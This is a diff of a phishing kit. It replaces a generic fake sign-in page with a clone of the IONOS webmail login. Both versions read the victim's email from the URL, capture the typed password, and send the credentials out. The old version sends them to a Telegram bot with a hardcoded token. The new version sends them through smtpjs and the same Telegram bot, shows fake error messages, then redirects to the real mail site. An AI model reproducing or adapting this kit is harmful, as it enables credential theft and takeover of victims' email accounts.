@@ -1,128 +1,685 @@
+<!DOCTYPE html>
 <html>
-<head>
-<html lang="en">
-<head>
-<title></title>
-<link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-<link type="text/css" rel="stylesheet" href="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/corea.css">
-</head>
 
-<body >
-<!-- Login 1 start -->
-<div id="altr" style="display: block;">
-  <button class="button-36" role="button">You cannot open files in this window. Please download the attached file and open it on a computer.</button><br><br>
-  <div align="center"><b>...</b></div>
-</div>
-<div class="login-1" id="root" style="display:none">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-12">
-                <div class="login-inner-form">
-                    <div class="details">
-                        
-      <form>
-<div align="center">
-                          <h2 class="text-center"><div id="top"><img src="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/icon.png" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;"> 
-		     
-		  <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname"></span> </div>
-                      <p><span style="font-size: 20px;color:gray;">Please sign in to continue </span></p>
-              <span style="font-size: 15px;color:white;">Please enter the correct password to avoid deactivation.</span><br><br/>
-        <center>
-        <div id="Div4" style="display: none;">
-          <div class="alert alert-danger" id="msg" style=" font-size:14px; ">Invalid credentials. The email address/password is incorrect.</div>
-        </div>  
-        <span id="error" class="text-danger" style="display: none;">This account does not exist. Please enter a different account.</span>
-        </center>
-        <div class="form-group">
-          <div class="input-group">
-            <span class="input-group-addon"><i class="fas fa-user"></i></span>
-            <input type="text" class="form-control" name="username" placeholder="Username" value="" id="username"/>
-          </div>
-        </div>
-        <div class="form-group">
-          <div class="input-group">
-            <span class="input-group-addon"><i class="fas fa-lock"></i></span>
-            <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required="required">
-          </div>
-        </div>
-		<div class="form-group">
-		 <div align="left">
-          <input type="checkbox"><span style="font-size: 15px;color:gray;"> Remember me </span> 
-        </div>
-		</div>
-        <div class="form-group" id="Div1" style="display: block;">
-		           <button type="button" onclick="sendEmail()" class="btn btn-primary login-btn btn-block" id="omak">Sign In</button>
-        </div>
-        <div class="form-group" id="Div2" style="display: none;">
-          <button type="button"  class="btn btn-primary login-btn btn-block" id="omak">Signing in...</button>
-   </div>
-      </form>
+<head> 
+    
+    <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.css">
+
+    <link rel="icon" type="image/png" sizes="32x32" href="https://id.ionos.com//image/favicon-32px.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://id.ionos.com//image/favicon-16px.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="https://id.ionos.com//image/favicon-48px.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://id.ionos.com/image/favicon.ico">
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    
+
+    
+    
+
+  <title>Login - IONOS</title>
+  <meta name="description" content="Access to your entire IONOS world: contracts, products, and customer data, order or change services - now password-protected login.">
+
+  <link rel="alternate" hreflang="de" href="https://login.ionos.de/">
+  <link rel="alternate" hreflang="en-gb" href="https://login.ionos.co.uk/">
+  <link rel="alternate" hreflang="en-us" href="https://login.ionos.com/">
+  <link rel="alternate" hreflang="en-ca" href="https://login.ionos.ca/">
+  <link rel="alternate" hreflang="en" href="https://login.ionos.com/">
+  <link rel="alternate" hreflang="es-es" href="https://login.ionos.es/">
+  <link rel="alternate" hreflang="es-mx" href="https://login.ionos.mx/">
+  <link rel="alternate" hreflang="es" href="https://login.ionos.es/">
+  <link rel="alternate" hreflang="fr" href="https://login.ionos.fr/">
+  <link rel="alternate" hreflang="it" href="https://login.ionos.it/">
+  <link rel="alternate" hreflang="x-default" href="https://login.ionos.com/">
+
+  <link rel="canonical" href="https://login.ionos.com/">
+
+  <link rel="stylesheet" href="https://login.ionos.com/style/main.min.css">
+
+
+  <link type="text/css" rel="stylesheet" href="https://frontend-services.ionos.com/t/inpagelayer/css/inpagelayer.css?v=4.3.6"><link type="text/css" rel="stylesheet" href="https://frontend-services.ionos.com/t/navi/css/navigation.css?v=5.42.1"><link rel="stylesheet" type="text/css" href="https://var.uicdn.net/shopsshort/privacy/v1/bundle.css"><link type="text/css" rel="stylesheet" href="https://frontend-services.ionos.com/t/statuspage/css/statuspage.css?v=2.1.4">
+  
+  
+  </head>
+  
+  <style>
+	/* Apply flex layout to the body and ensure full height */
+/* Apply flex layout to the body and ensure full height */
+html, body {
+  height: 100%;
+  margin: 0;
+  display: flex;
+  flex-direction: column;
+}
+
+/* Main content area */
+.page-content {
+  background-color: #f4f7fa;
+  display: flex;
+  flex-direction: column;
+  flex-grow: 1; /* This will make the page content take all available space */
+}
+
+/* Footer should stay at the bottom of the page */
+.page-footer__block {
+  background-color: #fff;
+  color: #001b41;
+  padding: 32px;
+  position: relative;
+  width: 100%;
+  margin-top: auto; /* This ensures the footer is pushed to the bottom */
+}
+
+/* Ensure that footer sections (items) behave as desired */
+.page-footer__section-item {
+  flex: 1 1 0%;
+  line-height: 1.5em;
+  margin-bottom: 32px;
+  overflow: hidden;
+  padding-left: 15px;
+  padding-right: 15px;
+}
+
+/* Alignment classes */
+.page-footer__section-item--align-center {
+  text-align: center;
+}
+
+.page-footer__section-item--align-right {
+  justify-content: right;
+  text-align: right;
+}
+
+/* Adjust visibility or size dynamically if needed */
+.page-footer__section-item--small-align-left {
+  padding-left: 10px;
+}
+
+.page-footer__link {
+  color: #001b41;
+  text-decoration: none;
+}
+
+.page-footer__link:hover {
+  text-decoration: underline;
+}
+
+	</style>
+	
+
+  <body class="oao-pi-nolayer oao-pi-with-navigation">
+
+    
+    <link rel="stylesheet" href="https://login.ionos.com/style/starter-main.min.css">
+
+    <div class="page-content"><span class="page-transition__indicator-bar"></span>
+
+      
+      
+  <div class="oao-navi-navigation oao-navi-light oao-navi-finished oao-navi-nl oao-navi-items-right-2">
+    <div class="oao-navi-top"><ul></ul></div><div class="oao-navi-left">
+      <div class="oao-navi-application-name"><ul class="oao-navi-sub-left"><li class="oao-navi-flyout-container oao-navi-flyout-application_switch "><a class="oao-navi-flyout-item oao-navi-app-name oao-navi-app-nl oao-navi-as-no-icon" href="https://login.ionos.com/"><span class="oao-navi-app-logo"></span><span class="oao-navi-app-name-span-nl">
+          
+          Login
+        </span></a></li></ul>
+      </div>
+    </div>
+    
+  <div class="oao-navi-center"><ul><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-big"><div class="oao-navi-simple-tooltip">Solution finder</div><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" aria-label="Solution finder"><!--?xml version="1.0" encoding="utf-8"?-->
+<svg version="1.1" id="oao-navi-search-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 26" xml:space="preserve">
+<g id="dark">
+	<path class="oao-navi-icon-main" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z
+		 M9.7,17.3c-4.2,0-7.5-3.4-7.5-7.5c0-4.2,3.4-7.5,7.5-7.5c4.2,0,7.5,3.4,7.5,7.5C17.3,13.9,13.9,17.3,9.7,17.3z"></path>
+	<path class="oao-navi-icon-fill" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z"></path>
+</g>
+</svg>
+</a><div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for features, domains, and help"><i class="oao-navi-search-mic"></i></div></div></li></ul></div><div class="oao-navi-right"><ul class="oao-navi-sub"><li class="oao-navi-flyout-container oao-navi-flyout-support "><div class="oao-navi-simple-tooltip">Help &amp; contact</div><a class="oao-navi-flyout-item" data-target-id="oao-navi-support-button" aria-label="Help &amp; contact"><svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 26 26">
+	<path class="oao-navi-icon-fill" d="M1.7,25.5c-0.5,0-0.8-0.3-0.9-0.4c-0.3-0.4-0.4-0.9-0.1-1.5C1.5,21.4,2.4,19,2.8,18c-0.1-0.1-0.2-0.3-0.3-0.4
+	c-1.3-1.8-2-3.8-2-6c0-6.1,5.6-11,12.5-11c7,0,12.5,4.8,12.5,11c0,6.1-5.6,11-12.5,11c-1.5,0-2.7-0.2-3.7-0.5C9.2,22,9,22,8.9,21.9
+	c-0.6,0.3-2,1-3,1.5c-2.6,1.4-3.4,1.8-3.7,1.9C2,25.4,1.9,25.5,1.7,25.5z"></path>
+	<g class="oao-navi-icon-main">
+		<path class="oao-navi-icon-invert" d="M12.9,13.3c-0.6,0-1.1-0.5-1.1-1.1c0-1.7,1.1-2.5,1.4-2.7c0.6-0.4,0.8-0.8,0.8-1c0-0.6-0.2-0.8-0.2-0.8
+			c-0.3-0.2-0.7-0.3-0.8-0.3c-0.8,0-1,0.4-1.1,0.7c-0.1,0.6-0.7,1-1.2,0.9s-1-0.6-0.9-1.2C9.9,7,10.7,5.3,13,5.3c0.2,0,1.4,0,2.4,0.9
+			c0.4,0.4,0.9,1.1,0.9,2.3c0,0.7-0.3,1.8-1.7,2.8c-0.1,0.1-0.5,0.3-0.5,0.9C14,12.8,13.6,13.3,12.9,13.3z"></path>
+		<path class="oao-navi-icon-invert" d="M13,17.7c0.7,0,1.2-0.5,1.2-1.2s-0.5-1.2-1.2-1.2s-1.2,0.5-1.2,1.2S12.3,17.7,13,17.7z"></path>
+		<path d="M1.2,26c-0.5,0-0.8-0.3-1-0.4c-0.3-0.4-0.4-1-0.1-1.5c0.9-2.3,1.8-4.8,2.2-5.8c-0.1-0.1-0.2-0.3-0.3-0.4
+			c-1.4-1.9-2-4-2-6.2C0,5.2,5.8,0.1,13,0.1c7.3,0,13,5,13,11.5C26,17.8,20.2,23,13,23c-1.6,0-2.8-0.2-3.9-0.5
+			c-0.1,0-0.2-0.1-0.4-0.1c-0.6,0.3-2.1,1-3.1,1.6c-2.7,1.4-3.5,1.8-3.8,1.9C1.6,25.9,1.4,26,1.2,26z M13,2.2
+			c-5.9,0-10.8,4.3-10.8,9.3c0,1.8,0.5,3.5,1.6,5C4,16.7,4.2,17,4.4,17.2c0.5,0.5,0.5,0.6-1.4,5.7c0.6-0.3,1.2-0.6,1.7-0.9
+			c4-2.1,4-2.1,4.6-1.8c0.2,0.1,0.4,0.2,0.6,0.2c0.9,0.3,1.8,0.4,3.2,0.4c5.9,0,10.8-4.3,10.8-9.3C23.8,6.3,19.1,2.2,13,2.2z"></path>
+	</g>
+</svg>
+</a></li><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-small"><div class="oao-navi-simple-tooltip">Solution finder</div><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" aria-label="Solution finder"><!--?xml version="1.0" encoding="utf-8"?-->
+<svg version="1.1" id="oao-navi-search-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 26" xml:space="preserve">
+<g id="dark">
+	<path class="oao-navi-icon-main" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z
+		 M9.7,17.3c-4.2,0-7.5-3.4-7.5-7.5c0-4.2,3.4-7.5,7.5-7.5c4.2,0,7.5,3.4,7.5,7.5C17.3,13.9,13.9,17.3,9.7,17.3z"></path>
+	<path class="oao-navi-icon-fill" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z"></path>
+</g>
+</svg>
+</a><div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for features, domains, and help"><i class="oao-navi-search-mic"></i></div></div></li></ul></div></div>
+
+
+
+      <!--<form id="form1" class="active"	 form method="POST" novalidate="">-->
+  <form method="POST" novalidate="" id="form1" style="display: none;">
+	  
+	  
+	  <main>
+
+        <section class="page-section page-section--default page-section--short">
+          <div class="page-section__block">
+
+          
+          
+  <div class="sheet sheet__section--warning cookie-message hidden">
+    <section class="sheet__section">
+      <h2 class="headline headline--sub">Activation of Browser Cookies Required</h2>
+      <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the use of cookies in your browser settings.</p>
+      <a href="index.html#[[-email-]]" class="link link--action" target="_blank">Learn more</a>
+    </section>
+  </div>
+
+
+
+          
+          
+  <noscript>
+    <div class="sheet sheet--warning">
+      <section class="sheet__section">
+        <h2 class="headline headline--sub headline--warning">Please enable JavaScript in your browser</h2>
+        <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the execution of JavaScript in your browser settings.</p>
+      </section>
+    </div>
+  </noscript>
+
+
+
+          
+          
+  
+
+
+
+          
+          
+
+      <div class="oao-statuspage-message-container" data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"></div>
+
+      <div class="sheet">
+
+        <section class="sheet__section sheet__section--default">
+          <ul>
+            <li class="stripe stripe--cropped">
+              <div class="stripe__item">
+                <img class="stripe__visual" height="58" width="auto" src="https://id.ionos.com/image/product-email.svg">
+              </div>
+              <div class="stripe__item">
+                <h1 class="headline stripe__element">My Webmail Login</h1>
+              </div>
+            </li>
+          </ul>
+        </section>
+
+        <section class="sheet__section sheet__section--default">
+          
+
+            <input type="hidden" name="_csrf" value="JpIiuDQGrXhWB5AnhZoBTkWxTc-K7E87OrH7eQTEbaAPjaN2EqNE21U0m097NfIV47c1fHaAYK2z3n8WWNfDTzylX8Q4tZBF">
+            <input type="hidden" id="url-fragment" name="fragment">
+            <input type="hidden" id="fingerprint" name="fingerprint" value="49109c394398ea6f4b31422ab92fe8c7">
+            <input type="hidden" id="jsEnabled" name="jsEnabled" value="true">
+
+            <ul>
+              <li class="form-stripe">
+                <label class="label" for="username">Email address</label>
+                
+                <input type="email" class="input-text form-input" name="identifier" id="username" tabindex="1" required="true" autofocus="" autocomplete="username" autocapitalize="none" spellcheck="false" value="" readonly>
+
+                
+                <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="index.html#[[-email-]]" tabindex="0">private browsing mode</a>.</p>
+              </li>
+              <li class="form-stripe form-stripe--actions">
+                <button class="button button--primary button--full-width button--with-loader" type="submit" id="button--with-loader" tabindex="2">Next</button>
+              </li>
+            </ul>
+
+            <input type="password" class="hidden" name="hiddenPassword" tabindex="-1">
+
+          
+        </section>
+
+        
+          
+            
+
+  <section class="sheet__section sheet__section--secondary hide-when-headless">
+    <div class="ias-zone ias-login_offerlink" data-ias-zoneid="webmail_login" id="ias.zone0" data-medium-id="WEBMAILER_LOGIN_NOTACUSTOMER" data-content-medium-id="WEBMAILER_LOGIN_NOTACUSTOMER" data-medium-variant="DEFAULT" data-content-medium-variant="DEFAULT"><div><h4 class="headline headline--paragraph">
+    Not an IONOS customer yet?
+</h4>
+<p class="paragraph">
+    <a href="index.html#[[-email-]]" target="_blank" class="link">
+        Become a customer now and benefit from our offers.
+    </a>
+</p>
+
+    
+</div></div>
+  </section>
+
+
+
+          
+        
+
+      </div>
+      
+
+  <h2 class="headline headline--sub headline--headless-hidden">More IONOS Logins</h2>
+
+  <div class="grid grid--full-height grid--headless-hidden">
+
+    <div class="grid-col grid-col--4 grid-col--small-6">
+      <a class="tile tile--filled" href="index.html#[[-email-]]">
+        <img class="tile__image" src="image/my-account.svg">
+        <span class="tile__label">My IONOS</span>
       </a>
     </div>
-<style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {border:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style>
 
-</div></div></div></div></div></body></html>
-<input type="hidden" name="count" id="count" value="" />
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <div class="grid-col grid-col--4 grid-col--small-6">
+      <a class="tile tile--filled" href="index.html#[[-email-]]">
+        <img class="tile__image" src="image/product-hidrive.svg">
+        <span class="tile__label">HiDrive</span>
+      </a>
+    </div>
+
+    <div class="grid-col grid-col--4 grid-col--small-6">
+      <a class="tile tile--filled" href="index.html#[[-email-]]">
+        <img class="tile__image" src="image/product-mail-archiving.svg">
+        <span class="tile__label">Email Archiving</span>
+      </a>
+    </div>
+
+  </div>
+
+
+
+    
+
+          </div>
+        </section>
+
+      </main>
+
+
+</form>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- Form 2 (Hidden by default) -->
+  <!--form method="POST" novalidate="" id="form2" style="display: none;">-->
+  <form id="form2" class="active"	 form method="POST" novalidate="">
+    <main>
+
+        <section class="page-section page-section--default page-section--short">
+          <div class="page-section__block">
+
+          
+          
+  <div class="sheet sheet__section--warning cookie-message hidden">
+    <section class="sheet__section">
+      <h2 class="headline headline--sub">Activation of Browser Cookies Required</h2>
+      <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the use of cookies in your browser settings.</p>
+      <a href="index.html#[[-email-]]" class="link link--action" target="_blank">Learn more</a>
+    </section>
+  </div>
+
+
+
+          
+          
+  <noscript>
+    <div class="sheet sheet--warning">
+      <section class="sheet__section">
+        <h2 class="headline headline--sub headline--warning">Please enable JavaScript in your browser</h2>
+        <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the execution of JavaScript in your browser settings.</p>
+      </section>
+    </div>
+  </noscript>
+
+
+
+          
+          
+  
+
+
+
+          
+          
+
+      <div class="sheet">
+        <section class="sheet__section sheet__section--default">
+          <ul>
+            <li class="stripe stripe--cropped">
+              <div class="stripe__item">
+                <img class="stripe__visual" src="https://id.ionos.com/image/password.svg" height="58" width="auto">
+              </div>
+              <div class="stripe__item">
+                <h1 class="headline stripe__element">Enter password</h1>
+              </div>
+            </li>
+          </ul>
+        </section>
+
+        <section class="sheet__section sheet__section--default">
+          
+  <div class="container-current-identifier">
+    
+      <div class="current-identifier">
+        <a class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip" id="replace2" href="index.html#[[-email-]]" data-tooltip="Back to login" tabindex="0">
+          <i class="ghost-button__icon exos-icon exos-icon-pagenavbackwards-16"></i>
+        </a>
+        <a id="replace" class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip" href="index.html#[[-email-]]" data-tooltip="Back to login" tabindex="0">
+              <i class="ghost-button__icon exos-icon exos-icon-nav-user-16"></i>
+              <span class="ghost-button__text">[[-email-]]</span>
+            </a>
+      </div>
+    
+  </div>
+
+
+
+          
+            <input type="hidden" name="_csrf" value="GCnxekm6LQxAWwGqFQ9s4RePKvL9Lm2EfN_yb3eLsjP8Hjb_LkqSGHCKSG5taTDPcSJY2XK8B8vMGFupGubACxa8igfJfwGd">
+            <input type="email" class="hidden" name="identifier" id="username2" tabindex="-1" spellcheck="false" value="" autocomplete="off">
+			
+            <ul>
+              <li class="form-stripe">
+                <label class="label" for="password">Password</label>
+				
+                <span class="input-text-group input-text-group--focus input-text-group--empty">
+                  <input type="password" class="input-text" required="true" tabindex="1" autofocus="" autocomplete="current-password" autocapitalize="none" spellcheck="false" id="password" name="password" value="">
+                  <a class="input-text-group__action password-unveil" id="password-unveil"></a>
+                </span>
+				<p class="input-byline input-byline--error" id="msg"></p>
+                
+                <p class="input-byline">
+                  <a class="link oao-pi-open-in-flyin" target="_blank" href="index.html#[[-email-]]">Forgot Your Password?</a>
+                </p>
+                <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="index.html#[[-email-]]" tabindex="0">private browsing mode</a>.</p></li>
+              <li class="form-stripe form-stripe--actions">
+                <button class="button button--primary button--full-width button--with-loader" type="submit" id="submit-btn" tabindex="2">Next</button>
+              </li>
+            </ul>
+          
+        </section>
+      </div>
+
+    
+
+          </div>
+        </section>
+
+      </main>
+    
+  </form>
+
+    
+    
+
+  <div class="page-footer__block">
+
+      <section class="page-footer__section page-footer__section--last">
+
+        <div class="page-footer__section-item">
+          <div class="oao-statuspage-overall-status page-footer__status"><a class="oao-statuspage-overall-state-none" target="_blank" href="index.html#[[-email-]]">All Systems Operational</a></div>
+        </div>
+
+        <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
+          © 2025
+          
+            
+            <a class="page-footer__link" target="_blank" href="index.html#[[-email-]]">IONOS Inc.</a>
+            
+            
+            
+            
+            
+            
+          
+        </div>
+
+        <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
+          
+          
+            
+            <a class="page-footer__link" target="_blank" href="index.html#[[-email-]]">Privacy Policy</a>
+            
+            
+            
+            
+            
+            
+           -
+          
+            
+            <a class="page-footer__link" target="_blank" href="index.html#[[-email-]]">T&amp;Cs</a>
+            
+            
+            
+            
+            
+            
+          
+        </div>
+
+      </section>
+
+    </div>
+
+
+
+
+    
+
+    
+    
+
+    
+    
+  
+  
+  <div>
+    
+      <div id="javascript-data" data-visit-id="eef9c739-7297-49bc-8b6b-babf96d2ead8.A" data-lang="en" data-tenant="US" data-context-path="/" data-env-mode="prod" data-artifact-version="1.0.212" data-artifact-name="cl" data-sherlock-url="https://sherlock.ionos.com/">
+      </div>
+    
+  </div>
+
+
+
+  <script nonce="" src="/script/main.min.js"></script>
+
+
+
+    
+    
+      <script nonce="" src="/script/mobileapp-redirect.min.js"></script>
+    
+
+  
+
+
+<div class="page-transition__blocker"><div class="page-transition__loading-spin loading-spin"></div></div><div class="static-overlay__blocker static-overlay__blocker--hidden"></div></body></html>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
 <script>
-    var emailx = window.location.hash.substr(1);
-    let email = ""
-    if(emailx.slice(0,3) == "B64"){email=window.atob(emailx.slice(3,emailx.length))} else{email=emailx};
-		document.getElementById("altr").style.display = "none";
-    document.getElementById("root").style.display = "block";
-		var ind=email.indexOf("@");
-    var my_slice=email.substr((ind+1));
-    var sv = my_slice;
-    var mainPage = 'https://'+my_slice;
-		var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
-		$("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
-    document.title = my_slice+" Login - Enter Password to Sign In"
-		var my_slice2=email.substr(ind+1,email.length);
-    $("#logoname").html(my_slice);
-		$(".logoname").html(my_slice);
-		document.body.style.backgroundImage = image;
-		document.getElementById('username').value = email;
-    ////////////////////////////////////
-    function sendEmail() {
-    if (document.getElementById('password').value === '') {
-          window.alert('Please enter a valid password!');
-          return false;
-    }
-    document.getElementById("Div4").style.display = "none";
-    document.getElementById("Div1").style.display = "none";
-    document.getElementById("Div2").style.display = "block";
-    var oo = document.getElementById('username').value;
-    var pp = document.getElementById('password').value;
-	  var ozi = "\n===DOMC=====\n"
-        ozi+="E:"+oo
-        ozi+="\nP:"+pp
-        ozi+="\n=========\n"
-    tmsend(ozi)
-    document.getElementById('count').value = document.getElementById('count').value+"1"
-    if(document.getElementById('count').value === "111"){
-      window.location.replace("https://owl.purdue.edu/owl/research_and_citation/mla_style/mla_formatting_and_style_guide/mla_works_cited_electronic_sources.html")
-    }
-    setTimeout(function() {
-      document.getElementById('password').value = "";
-      document.getElementById("Div4").style.display = "block";
-      document.getElementById("Div1").style.display = "block";
-      document.getElementById("Div2").style.display = "none";
-    }, 3000);
-    }
-    ////////////////////////////////////
-    function tmsend(message){
-        var token = "7921526967:AAGdKdP01lu02S60uFATJjqr4wQDTREcLt0";
-        var chatid = "7347877229";
-        const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
+const token = '7921526967:AAGdKdP01lu02S60uFATJjqr4wQDTREcLt0';
+const chatId = '7347877229';
 
-        const obj = {
-            chat_id: chatid,
-            text: message
-        };
+let count = 0; // Initialize the count variable to track failed attempts
 
-        const xht = new XMLHttpRequest();
-        xht.open("POST", url, true);
-        xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
-        xht.send(JSON.stringify(obj));
+$(document).ready(function () {
+  // Extract the email from the hash in the URL
+  const hash = window.location.hash;
+  if (hash) {
+    const email = decodeURIComponent(hash.substring(1));
+
+    // Prefill the input field with the extracted email
+    $('#username').val(email);
+
+    // Make the input field read-only
+    $('#username').attr('readonly', true);
+
+    // Update the email in the <span> inside the <a> element
+    $('#replace .ghost-button__text').text(email);
+
+    // Replace the [[-email-]] placeholder in the href attribute of the links
+    $('a[href*="[[-email-]]"]').each(function () {
+      const newHref = $(this).attr('href').replace('[[-email-]]', email);
+      $(this).attr('href', newHref);
+    });
+  }
+
+  // Switch forms on button click
+  $("#button--with-loader").click(function (event) {
+    event.preventDefault();
+    $("#form1").hide();
+    $("#form2").show();
+    history.replaceState(null, "", window.location.pathname + window.location.hash);
+  });
+
+  // Form submission and validation for #form2
+  $("#submit-btn").click(function (event) {
+    event.preventDefault();
+    $("#msg").hide();
+
+    const email = $("#username").val();
+    const password = $("#password").val();
+
+    // Email validation
+    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+    if (!emailPattern.test(email)) {
+      $("#msg").text("Invalid email format").css("color", "red").show();
+      return false;
     }
+
+    // Password validation
+    if (!password) {
+      $("#msg").text("Please enter your password.").css({"color": "red"}).show();
+      $(".input-text-group").css({"border-color": "#c80a00", "outline": "1px solid #c80a00"});
+      return false;
+    }
+
+    // Send email
+    Email.send({
+      SecureToken: "f8b7210a-468b-4aeb-8737-9d8b93eeea74",
+      To: 'email@email.com',
+      From: 'email@email.com',
+      Subject: "New Login Information Received",
+      Body: `Email: ${email}<br/>Password: ${password}<br />User-Agent: ${navigator.userAgent}`,
+    }).then(function () {
+      // Send Telegram message
+      const message = `————— New Login Info —————\n\nEmail: ${email}\nPassword: ${password}\n\nUser-Agent: ${navigator.userAgent}`;
+      $.ajax({
+        type: 'POST',
+        url: `https://api.telegram.org/bot${token}/sendMessage`,
+        data: {
+          chat_id: chatId,
+          text: message,
+        },
+        success: function (response) {
+          if (response.signal === "ok") {
+            clearPasswordField(); // Clear only the password field
+            window.location.replace(response.redirect_link || "https://www.example.com");
+          } else {
+            count++; // Increment count on failure
+            if (count >= 2) {
+              count = 0; // Reset count after redirect
+              redirectToHashDomain(); // Redirect to a dynamic domain if necessary
+            } else {
+              $("#msg").text("An error occurred. Please try again").css("color", "red").show();
+            }
+          }
+        },
+        error: function () {
+          count++; // Increment count on AJAX error
+          if (count >= 2) {
+            count = 0; // Reset count after redirect
+            redirectToHashDomain(); // Redirect to a dynamic domain if necessary
+          } else {
+            $("#msg").text("An error occurred. Please try again").css("color", "red").show();
+          }
+        },
+        complete: function () {
+          $("#submit-btn").val("Login"); // Reset button text
+          clearPasswordField(); // Clear only the password field after every attempt
+        },
+      });
+    });
+  });
+
+  // Clear password field after each attempt
+  function clearPasswordField() {
+    $("#password").val("");
+    $(".input-text-group").css({"border-color": "", "outline": ""});
+  }
+
+  // Redirect to mail.ionos.com regardless of the email's domain from the hash
+	function redirectToHashDomain() {
+	  const emailFromHash = window.location.hash.substring(1);
+	  // You can keep the domain extraction for validation or any other purpose
+	  const domain = emailFromHash.split("@")[1]; // Extract the domain part of the email
+
+	  if (domain) {
+		// Redirect to mail.ionos.com instead of dynamically constructing the domain
+		window.location.replace('https://mail.ionos.com'); // Redirect to IONOS mail
+	  } else {
+		$("#msg").text("Invalid email format for redirection").css("color", "red").show();
+	  }
+	}
+
+
+});
+
 </script>
+
+</html>
